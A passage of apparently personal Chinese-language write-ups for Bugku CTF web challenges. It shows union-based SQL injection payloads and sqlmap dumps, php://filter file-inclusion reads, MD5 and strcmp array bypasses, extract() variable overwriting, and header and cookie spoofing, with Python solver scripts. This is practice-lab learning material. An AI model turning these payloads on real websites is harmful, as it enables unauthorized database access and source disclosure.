class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">直接password=就出答案了？？？我？？？</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 字符？正则？</span></span><br><span class="line"><span class="string">&lt;?php </span></span><br><span class="line"><span class="string">highlight_file('2.php');</span></span><br><span class="line"><span class="string">$key='KEY&#123;********************************&#125;';</span></span><br><span class="line"><span class="string">$IM= preg_match("</span>/key.*key.&#123;<span class="number">4</span>,<span class="number">7</span>&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i<span class="string">", trim($_GET["</span>id<span class="string">"]), $match);</span></span><br><span class="line"><span class="string">if( $IM )&#123; </span></span><br><span class="line"><span class="string">die('key is: '.$key);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt; </span></span><br><span class="line"><span class="string">单纯的考正则表达式，只要id成功匹配就会出flag，注意!!!最后一个是匹配任意标点符号!!!</span></span><br><span class="line"><span class="string">定界符：/和/（除了\和字母数字,其它的只要是成对出现都可以看做定界符，比如##、！！之类的）</span></span><br><span class="line"><span class="string">/i 表示忽略大小写</span></span><br><span class="line"><span class="string">id=key0key4434key:/a/aakeyb.</span></span><br><span class="line"><span class="string">忘记了最后那个标点符号，差点怀疑人生</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 程序员本地网站</span></span><br><span class="line"><span class="string">直接在请求头里添加 X-Forwarded-For:127.0.0.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 你从哪里来</span></span><br><span class="line"><span class="string">are you from google?</span></span><br><span class="line"><span class="string">将 refer 头修改为 https://www.google.com</span></span><br><span class="line"><span class="string">www.google.com 都不行</span></span><br><span class="line"><span class="string">http://www.google.com 都不行 :)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># login1(SKCTF)</span></span><br><span class="line"><span class="string">hint:SQL约束攻击</span></span><br><span class="line"><span class="string">先注册  user:admin                                    1</span></span><br><span class="line"><span class="string"> passwd:Abc123</span></span><br><span class="line"><span class="string">然后 用admin,Abc123也能登录上了</span></span><br><span class="line"><span class="string">[约束攻击详解](https://www.freebuf.com/articles/web/124537.html)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># md5 collision(NUPT_CTF)</span></span><br><span class="line"><span class="string">题目是MD5碰撞，直接传一个MD5以0e开头的过去</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 秋名山老司机</span></span><br><span class="line"><span class="string">亲请在2s内计算老司机的车速是多少</span></span><br><span class="line"><span class="string">每次显示一些随机的大数相加减</span></span><br><span class="line"><span class="string">我想到了py直接提交请求，然而自己独立写不出来</span></span><br><span class="line"><span class="string">import requests </span></span><br><span class="line"><span class="string">import re </span></span><br><span class="line"><span class="string">url = 'http://123.206.87.240:8002/qiumingshan/' </span></span><br><span class="line"><span class="string">s = requests.Session() </span></span><br><span class="line"><span class="string">source = s.get(url) </span></span><br><span class="line"><span class="string">expression = re.search(r'(\d+[+\-*])+(\d+)', source.text).group() </span></span><br><span class="line"><span class="string">result = eval(expression) </span></span><br><span class="line"><span class="string">post = &#123;'value': result&#125; </span></span><br><span class="line"><span class="string">print(s.post(url, data = post).text)</span></span><br><span class="line"><span class="string">必须利用会话对象 Session()，否则提交结果的时候，页面又重新生成一个新的表达式</span></span><br><span class="line"><span class="string">利用正则表达式截取响应内容中的算术表达式。首先引入 re 模块，其次用 search() 匹配算术表达式，匹配成功后用 group() 返回算术表达式的字符串。</span></span><br><span class="line"><span class="string">获得算术表达式的字符串后，直接利用 Python 的內建方法 eval() 来计算出结果，简单、暴力、快捷。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># web8</span></span><br><span class="line"><span class="string">txt？？？？</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">extract($_GET);</span></span><br><span class="line"><span class="string">if (!empty($ac)) &#123;</span></span><br><span class="line"><span class="string">$f = trim(file_get_contents($fn));</span></span><br><span class="line"><span class="string">if ($ac === $f)</span></span><br><span class="line"><span class="string">echo "</span>&lt;p&gt;This is flag:<span class="string">" ."</span> $flag&lt;/p&gt;<span class="string">";</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">echo "</span>&lt;p&gt;sorry!&lt;/p&gt;<span class="string">";</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">empty() 以下情况将返回TRUE</span></span><br><span class="line"><span class="string">"</span><span class="string">" (空字符串)</span></span><br><span class="line"><span class="string">0 (作为整数的0)</span></span><br><span class="line"><span class="string">0.0 (作为浮点数的0)</span></span><br><span class="line"><span class="string">"</span><span class="number">0</span><span class="string">" (作为字符串的0)</span></span><br><span class="line"><span class="string">NULL</span></span><br><span class="line"><span class="string">FALSE</span></span><br><span class="line"><span class="string">array() (一个空数组)</span></span><br><span class="line"><span class="string">$var; (一个声明了，但是没有值的变量)</span></span><br><span class="line"><span class="string">单个参数的extract()自然想到变量覆盖，然而$ac又不能为空</span></span><br><span class="line"><span class="string">扫了后台扫了个2.php，又提示txt，ac=txt&amp; fn=2.php，结果没卵用，哈哈</span></span><br><span class="line"><span class="string">试了好几次后选择看writeup</span></span><br><span class="line"><span class="string">1.ac=flags&amp; fn=flag.txt，这个想法真是脑洞打开</span></span><br><span class="line"><span class="string">2.利用伪协议读取post，妙极了</span></span><br><span class="line"><span class="string">ac=233 &amp; fn=php://input</span></span><br><span class="line"><span class="string">再post一个233，齐活儿</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 前女友(SKCTF)</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">if(isset($_GET['v1']) &amp;&amp; isset($_GET['v2']) &amp;&amp; isset($_GET['v3']))&#123;</span></span><br><span class="line"><span class="string">$v1 = $_GET['v1'];</span></span><br><span class="line"><span class="string">$v2 = $_GET['v2'];</span></span><br><span class="line"><span class="string">$v3 = $_GET['v3'];</span></span><br><span class="line"><span class="string">if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123;</span></span><br><span class="line"><span class="string">if(!strcmp($v3, $flag))&#123;</span></span><br><span class="line"><span class="string">echo $flag;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">md5碰撞，数组绕过strcmp()，做完了</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 速度要快</span></span><br><span class="line"><span class="string">我感觉你得快点!!!</span></span><br><span class="line"><span class="string">查看源码  =&gt;  &lt;!-- OK ,now you have to post the margin what you find --&gt;</span></span><br><span class="line"><span class="string">找啊找啊，响应头里面发现了一个 flag 键名</span></span><br><span class="line"><span class="string">刷新一下还会变，flag: 6LeR55qE6L+Y5LiN6ZSZ77yM57uZ5L2gZmxhZ+WQpzogTmpNek56RXo=</span></span><br><span class="line"><span class="string">那就上py脚本搞吧，注意建立会话对象 session(),否则已提交，flag又变了</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">import requests</span></span><br><span class="line"><span class="string">import base64</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">url = 'http://123.206.87.240:8002/web6/'</span></span><br><span class="line"><span class="string">req = requests.session()</span></span><br><span class="line"><span class="string">flag = req.get(url).headers['flag']</span></span><br><span class="line"><span class="string">flag = base64.b64decode(flag)</span></span><br><span class="line"><span class="string">print(flag)</span></span><br><span class="line"><span class="string">flag = flag.decode()  # 防止split()报错</span></span><br><span class="line"><span class="string">flag = base64.b64decode(flag.split(':')[1])  # 解码两次才变成数值</span></span><br><span class="line"><span class="string">print(flag)</span></span><br><span class="line"><span class="string">data = &#123;'margin':flag&#125;</span></span><br><span class="line"><span class="string">print(req.post(url,data).content)  # 此处为了看得方便可继续解码，不过没必要</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 一定要养成手动保存的好习惯，东西丢了还是很伤心的，又要重写</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># cookies欺骗</span></span><br><span class="line"><span class="string">得到这么一个字符串：</span></span><br><span class="line"><span class="string">rfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibry</span></span><br><span class="line"><span class="string">还有一个地址：index.php?line=&amp; filename=a2V5cy50eHQ= (keys.txt)</span></span><br><span class="line"><span class="string">直接查看keys.txt，发现还是这么一段乱七八糟的字符串</span></span><br><span class="line"><span class="string">上面那个又向一个文件包含，filename传入的还是一个base64编码，看看 aW5kZXgucGhw (index.php)</span></span><br><span class="line"><span class="string">乍一看还是什么都没有，调整一下line的参数，有点东西了，一点一点扒下来</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">error_reporting(0);</span></span><br><span class="line"><span class="string">$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"</span><span class="string">");</span></span><br><span class="line"><span class="string">$line=isset($_GET['line'])?intval($_GET['line']):0;</span></span><br><span class="line"><span class="string">if($file=='') header("</span>location:index.php?line=&amp;filename=a2V5cy50eHQ=<span class="string">");</span></span><br><span class="line"><span class="string">$file_list = array('0' =&gt;'keys.txt','1' =&gt;'index.php',);</span></span><br><span class="line"><span class="string">if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin')&#123;</span></span><br><span class="line"><span class="string">$file_list[2]='keys.php';</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">if(in_array($file, $file_list))&#123;</span></span><br><span class="line"><span class="string">$fa = file($file);</span></span><br><span class="line"><span class="string">echo $fa[$line];</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">此时改一下 cookies，margin=margin，游戏结束</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># flag在index里</span></span><br><span class="line"><span class="string">http://123.206.87.240:8005/post/index.php?file=show.php</span></span><br><span class="line"><span class="string">既然说flag在index里，看一下index源码，?file=php://filter/read=convert.base64-encode/resource=index.php</span></span><br><span class="line"><span class="string">PGh0bWw+DQogICAgPHRpdGxlPkJ1Z2t1LWN0ZjwvdGl0bGU+DQogICAgDQo8P3BocA0KCWVycm9yX3JlcG9ydGluZygwKTsNCglpZighJF9HRVRbZmlsZV0pe2VjaG8gJzxhIGhyZWY9Ii4vaW5kZXgucGhwP2ZpbGU9c2hvdy5waHAiPmNsaWNrIG1lPyBubzwvYT4nO30NCgkkZmlsZT0kX0dFVFsnZmlsZSddOw0KCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpew0KCQllY2hvICJPaCBubyEiOw0KCQlleGl0KCk7DQoJfQ0KCWluY2x1ZGUoJGZpbGUpOyANCi8vZmxhZzpmbGFne2VkdWxjbmlfZWxpZl9sYWNvbF9zaV9zaWh0fQ0KPz4NCjwvaHRtbD4NCg==</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">解码一下</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Bugku-ctf&lt;/title&gt;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">error_reporting(0);</span></span><br><span class="line"><span class="string">if(!$_GET[file])&#123;echo '&lt;a href="</span>./index.php?file=show.php<span class="string">"&gt;click me? no&lt;/a&gt;';&#125;</span></span><br><span class="line"><span class="string">$file=$_GET['file'];</span></span><br><span class="line"><span class="string">if(strstr($file,"</span>../<span class="string">")||stristr($file, "</span>tp<span class="string">")||stristr($file,"</span>input<span class="string">")||stristr($file,"</span>data<span class="string">"))&#123;</span></span><br><span class="line"><span class="string">echo "</span>Oh no!<span class="string">";</span></span><br><span class="line"><span class="string">exit();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">include($file); </span></span><br><span class="line"><span class="string">//flag:flag&#123;edulcni_elif_lacol_si_siht&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 成绩单</span></span><br><span class="line"><span class="string">发现一个用 post 传 id 的输入框，注入题</span></span><br><span class="line"><span class="string">-1' union select 1,2,3,database()#</span></span><br><span class="line"><span class="string">-1' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#</span></span><br><span class="line"><span class="string">-1' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x666c3467#  // 这里用16进制绕过一下</span></span><br><span class="line"><span class="string">-1' union select 1,2,3,skctf_flag from fl4g#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sqlmap 也能跑出来，牛</span></span><br><span class="line"><span class="string">sqlmap -u URL --data="</span>id=<span class="number">1</span><span class="string">"</span></span><br><span class="line"><span class="string">[11:01:58] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12</span></span><br><span class="line"><span class="string">发现后台数据库是 mysql</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">列举所有数据库</span></span><br><span class="line"><span class="string">sqlmap -u URL --data="</span>id=<span class="number">1</span><span class="string">" --dbs</span></span><br><span class="line"><span class="string">available databases [2]:</span></span><br><span class="line"><span class="string">[*] information_schema</span></span><br><span class="line"><span class="string">[*] skctf_flag</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆出所有表</span></span><br><span class="line"><span class="string">sqlmap -u URL --data="</span>id=<span class="number">1</span><span class="string">" -D skctf_flag --tables</span></span><br><span class="line"><span class="string">Database: skctf_flag</span></span><br><span class="line"><span class="string">[2 tables]</span></span><br><span class="line"><span class="string">+------+</span></span><br><span class="line"><span class="string">| fl4g |</span></span><br><span class="line"><span class="string">| sc   |</span></span><br><span class="line"><span class="string">+------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">列出内容</span></span><br><span class="line"><span class="string">sqlmap -u http://123.206.87.240:8002/chengjidan/index.php --data="</span>id=<span class="number">1</span><span class="string">" -T fl4g --dump </span></span><br><span class="line"><span class="string">也可以选择全弄出来：sqlmap -u http://123.206.87.240:8002/chengjidan/index.php --data="</span>id=<span class="number">1</span><span class="string">" -D skctf_flag --dump</span></span><br><span class="line"><span class="string">Database: skctf_flag</span></span><br><span class="line"><span class="string">Table: fl4g</span></span><br><span class="line"><span class="string">[1 entry]</span></span><br><span class="line"><span class="string">+---------------------------------+</span></span><br><span class="line"><span class="string">| skctf_flag                      |</span></span><br><span class="line"><span class="string">+---------------------------------+</span></span><br><span class="line"><span class="string">| BUGKU&#123;Sql_INJECT0N_4813drd8hz4&#125; |</span></span><br><span class="line"><span class="string">+---------------------------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 备份是个好习惯</span></span><br><span class="line"><span class="string">d41d8cd98f00b204e9800998ecf8427e</span></span><br><span class="line"><span class="string">d41d8cd98f00b204e9800998ecf8427e</span></span><br><span class="line"><span class="string">提示提到了备份，应该是备份文件源码泄漏一类的，用脚本跑下后台有没有源码 &#123;工具在 F/CTF_tools/源码泄露&#125;</span></span><br><span class="line"><span class="string">得到 index.php.bak</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">include_once "</span>flag.php<span class="string">";</span></span><br><span class="line"><span class="string">ini_set("</span>display_errors<span class="string">", 0);</span></span><br><span class="line"><span class="string">$str = strstr($_SERVER['REQUEST_URI'], '?');</span></span><br><span class="line"><span class="string">$str = substr($str,1);</span></span><br><span class="line"><span class="string">$str = str_replace('key','',$str);</span></span><br><span class="line"><span class="string">parse_str($str);</span></span><br><span class="line"><span class="string">echo md5($key1);</span></span><br><span class="line"><span class="string">echo md5($key2);</span></span><br><span class="line"><span class="string">if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;</span></span><br><span class="line"><span class="string">echo $flag."</span>取得flag<span class="string">";</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">有个替换性的过滤，用 kekeyy 就能绕过</span></span><br><span class="line"><span class="string">分析源码，有个 parse_str()，此函数与 extract() 差不多，将关联数组中的元素与变量联系起来</span></span><br><span class="line"><span class="string">那么就可以这样传值进去，kekeyy1 &amp; kekeyy2[]</span></span><br><span class="line"><span class="string">MD5函数无法处理数组，于是可以用 kekeyy1[]=33 &amp; kekeyy2[]=44 进行绕过</span></span><br><span class="line"><span class="string">或者直接 MD5碰撞</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># never give up</span></span><br><span class="line"><span class="string">查看源码，发现一个小注释:1p.html</span></span><br><span class="line"><span class="string">一打开就跳转到其他页面，拿burp抓一下，发现如下信息</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">var Words ="</span>%<span class="number">3</span>Cscript%<span class="number">3</span>Ewindow.location.href%<span class="number">3</span>D%<span class="number">27</span>http%<span class="number">3</span>A<span class="comment">//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E" </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">OutWord</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">var</span> NewWords;</span><br><span class="line">NewWords = unescape(Words);</span><br><span class="line">document.write(NewWords);</span><br><span class="line">&#125; </span><br><span class="line">OutWord();</span><br><span class="line">然后一路解码，得到代码</span><br><span class="line">&lt;script&gt;window.location.href=<span class="string">'http://www.bugku.com'</span>;&lt;/script&gt; </span><br><span class="line">&lt;!--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ==--&gt;</span><br><span class="line"></span><br><span class="line">%<span class="number">22</span>%<span class="number">3</span>Bif%<span class="number">28</span>%<span class="number">21</span>%<span class="number">24</span>_GET%<span class="number">5</span>B%<span class="number">27</span>id%<span class="number">27</span>%<span class="number">5</span>D%<span class="number">29</span>%<span class="number">0</span>A%<span class="number">7</span>B%<span class="number">0</span>A%<span class="number">09</span>header%<span class="number">28</span>%<span class="number">27</span>Location%<span class="number">3</span>A%<span class="number">20</span>hello.php%<span class="number">3</span>Fid%<span class="number">3</span>D1%<span class="number">27</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">09</span><span class="keyword">exit</span>%<span class="number">28</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">7</span>D%<span class="number">0</span>A%<span class="number">24</span>id%<span class="number">3</span>D%<span class="number">24</span>_GET%<span class="number">5</span>B%<span class="number">27</span>id%<span class="number">27</span>%<span class="number">5</span>D%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">24</span>a%<span class="number">3</span>D%<span class="number">24</span>_GET%<span class="number">5</span>B%<span class="number">27</span>a%<span class="number">27</span>%<span class="number">5</span>D%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">24</span>b%<span class="number">3</span>D%<span class="number">24</span>_GET%<span class="number">5</span>B%<span class="number">27</span>b%<span class="number">27</span>%<span class="number">5</span>D%<span class="number">3</span>B%<span class="number">0</span>Aif%<span class="number">28</span>stripos%<span class="number">28</span>%<span class="number">24</span>a%<span class="number">2</span>C%<span class="number">27.</span>%<span class="number">27</span>%<span class="number">29</span>%<span class="number">29</span>%<span class="number">0</span>A%<span class="number">7</span>B%<span class="number">0</span>A%<span class="number">09</span><span class="keyword">echo</span>%<span class="number">20</span>%<span class="number">27</span>no%<span class="number">20</span>no%<span class="number">20</span>no%<span class="number">20</span>no%<span class="number">20</span>no%<span class="number">20</span>no%<span class="number">20</span>no%<span class="number">27</span>%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">09</span><span class="keyword">return</span>%<span class="number">20</span>%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">7</span>D%<span class="number">0</span>A%<span class="number">24</span>data%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>@file_get_contents%<span class="number">28</span>%<span class="number">24</span>a%<span class="number">2</span>C%<span class="number">27</span>r%<span class="number">27</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">0</span>Aif%<span class="number">28</span>%<span class="number">24</span>data%<span class="number">3</span>D%<span class="number">3</span>D%<span class="number">22</span>bugku%<span class="number">20</span>is%<span class="number">20</span>a%<span class="number">20</span>nice%<span class="number">20</span>plateform%<span class="number">21</span>%<span class="number">22</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>%<span class="number">24</span>id%<span class="number">3</span>D%<span class="number">3</span>D0%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>strlen%<span class="number">28</span>%<span class="number">24</span>b%<span class="number">29</span>%<span class="number">3E5</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>eregi%<span class="number">28</span>%<span class="number">22111</span>%<span class="number">22.</span>substr%<span class="number">28</span>%<span class="number">24</span>b%<span class="number">2</span>C0%<span class="number">2</span>C1%<span class="number">29</span>%<span class="number">2</span>C%<span class="number">221114</span>%<span class="number">22</span>%<span class="number">29</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>substr%<span class="number">28</span>%<span class="number">24</span>b%<span class="number">2</span>C0%<span class="number">2</span>C1%<span class="number">29</span>%<span class="number">21</span>%<span class="number">3</span>D4%<span class="number">29</span>%<span class="number">0</span>A%<span class="number">7</span>B%<span class="number">0</span>A%<span class="number">09</span><span class="keyword">require</span>%<span class="number">28</span>%<span class="number">22</span>f4l2a3g.txt%<span class="number">22</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">7</span>D%<span class="number">0</span>Aelse%<span class="number">0</span>A%<span class="number">7</span>B%<span class="number">0</span>A%<span class="number">09</span><span class="keyword">print</span>%<span class="number">20</span>%<span class="number">22</span>never%<span class="number">20</span>never%<span class="number">20</span>never%<span class="number">20</span>give%<span class="number">20</span>up%<span class="number">20</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">7</span>D%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">3</span>F%<span class="number">3</span>E</span><br><span class="line"></span><br><span class="line"><span class="string">";if(!$_GET['id']) &#123;</span></span><br><span class="line"><span class="string">header('Location: hello.php?id=1');</span></span><br><span class="line"><span class="string">exit();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">$id=$_GET['id'];</span></span><br><span class="line"><span class="string">$a=$_GET['a'];</span></span><br><span class="line"><span class="string">$b=$_GET['b'];</span></span><br><span class="line"><span class="string">if(stripos($a,'.'))&#123;</span></span><br><span class="line"><span class="string">echo 'no no no no no no no';</span></span><br><span class="line"><span class="string">return ;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">$data = @file_get_contents($a,'r');</span></span><br><span class="line"><span class="string">if($data=="</span>bugku is a nice plateform!<span class="string">" and $id==0 and strlen($b)&gt;5 and eregi("</span><span class="number">111</span><span class="string">".substr($b,0,1),"</span><span class="number">1114</span><span class="string">") and substr($b,0,1)!=4)</span></span><br><span class="line"><span class="string">require("</span>f4l2a3g.txt<span class="string">");</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">print "</span>never never never give up !!!<span class="string">";</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">既然是 require(f4l2a3g.txt) 直接看看这个文件？flag就直接能看到了</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 细心</span></span><br><span class="line"><span class="string">出现一个假的404页面，源代码里面也啥都没有，尝试扫扫后台，发现 robots.txt</span></span><br><span class="line"><span class="string">打开它，发现一个 resusl.php 文件，再进去看一下，提示 _GET['x'] == password</span></span><br><span class="line"><span class="string">提交 x = admin ，结果真中了，如果还没出来，只能想办法爆破了</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># flag.php</span></span><br><span class="line"><span class="string">有个登录框，点 login 没反应，题名叫 flag.php，肯定有这个文件，进去看一下</span></span><br><span class="line"><span class="string">啥都没有。上面提交之所以没反应，是因为 action=#，之前猜测直接给flag.php post </span></span><br><span class="line"><span class="string">user &amp; password 的值，还是没卵用，试试post hint?，还是没用，最终看别人的解释是</span></span><br><span class="line"><span class="string">在flagphp处get hint=1，直接出源码了？？还是要多尝试，反正就这么多套路</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> &lt;?php</span></span><br><span class="line"><span class="string">error_reporting(0);</span></span><br><span class="line"><span class="string">include_once("</span>flag.php<span class="string">");</span></span><br><span class="line"><span class="string">$cookie = $_COOKIE['ISecer'];</span></span><br><span class="line"><span class="string">if(isset($_GET['hint']))</span></span><br><span class="line"><span class="string">show_source(__FILE__);</span></span><br><span class="line"><span class="string">elseif (unserialize($cookie) === 